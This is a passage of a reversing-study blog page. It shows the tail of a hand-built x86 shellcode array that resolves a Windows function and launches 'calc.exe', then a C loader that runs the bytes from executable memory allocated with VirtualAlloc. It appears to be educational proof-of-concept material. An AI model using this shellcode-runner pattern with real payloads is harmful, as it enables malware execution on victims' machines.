class=mh>0x85</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x4c</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0xd0</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0xc2</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0xd0</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0xb6</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0xb6</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0xc2</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0xb6</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0xb6</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0xc2</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x5f</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0xb6</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0xb6</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x2a</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0xc2</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x4c</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0xb6</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0xb6</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x2b</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0xc2</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0xb6</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0xb6</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x2c</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0xc2</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0xb6</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0xb6</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x2d</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0xc2</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0xb6</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0xb6</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x2e</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0xc2</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x7c</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0xe9</span><span class=p>,</span> <span class=mh>0x55</span><span class=p>,</span> <span class=mh>0xff</span><span class=p>,</span> <span class=mh>0xff</span><span class=p>,</span> <span class=mh>0xff</span><span class=p>,</span> <span class=mh>0x90</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x7c</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x8d</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0xd0</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0xb7</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x3e</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0xbf</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x3e</span><span class=p>,</span> <span class=mh>0x8d</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x85</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0xd0</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0xd0</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0xc7</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x1f</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0xc7</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x2e</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0xc6</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0xc7</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x8d</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x1f</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0xff</span><span class=p>,</span> <span class=mh>0xd0</span>
+</span></span><span class=line><span class=cl><span class=p>};</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>void</span><span class=o>*</span> <span class=n>exec_mem</span> <span class=o>=</span> <span class=nf>VirtualAlloc</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=nb>NULL</span><span class=p>,</span>                          
+</span></span><span class=line><span class=cl>        <span class=k>sizeof</span><span class=p>(</span><span class=n>shellcode</span><span class=p>),</span>             
+</span></span><span class=line><span class=cl>        <span class=n>MEM_COMMIT</span> <span class=o>|</span> <span class=n>MEM_RESERVE</span><span class=p>,</span>      
+</span></span><span class=line><span class=cl>        <span class=n>PAGE_EXECUTE_READWRITE</span>         
+</span></span><span class=line><span class=cl>    <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>exec_mem</span><span class=p>,</span> <span class=n>shellcode</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>shellcode</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=p>((</span><span class=kt>void</span><span class=p>(</span><span class=o>*</span><span class=p>)())</span><span class=n>exec_mem</span><span class=p>)();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/reversing/>Reversing</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/layer7-reversing-mini-ctf-write-up/><div class=article-details><h2 class=article-title>Layer7 Reversing mini CTF | Write-up</h2></div></a></article><article><a href=/p/layer7-%EB%A6%AC%EB%B2%84%EC%8B%B1-8%EC%B0%A8%EC%8B%9C/><div class=article-details><h2 class=article-title>Layer7 리버싱 8차시</h2></div></a></article><article><a href=/p/layer7-%EB%A6%AC%EB%B2%84%EC%8B%B1-7%EC%B0%A8%EC%8B%9C/><div class=article-details><h2 class=article-title>Layer7 리버싱 7차시</h2></div></a></article><article><a href=/p/layer7-%EB%A6%AC%EB%B2%84%EC%8B%B1-6%EC%B0%A8%EC%8B%9C/><div class=article-details><h2 class=article-title>Layer7 리버싱 6차시</h2></div></a></article><article><a href=/p/layer7-%EB%A6%AC%EB%B2%84%EC%8B%B1-5%EC%B0%A8%EC%8B%9C/><div class=article-details><h2 class=article-title>Layer7 리버싱 5차시</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2025 T43W00</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.31.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
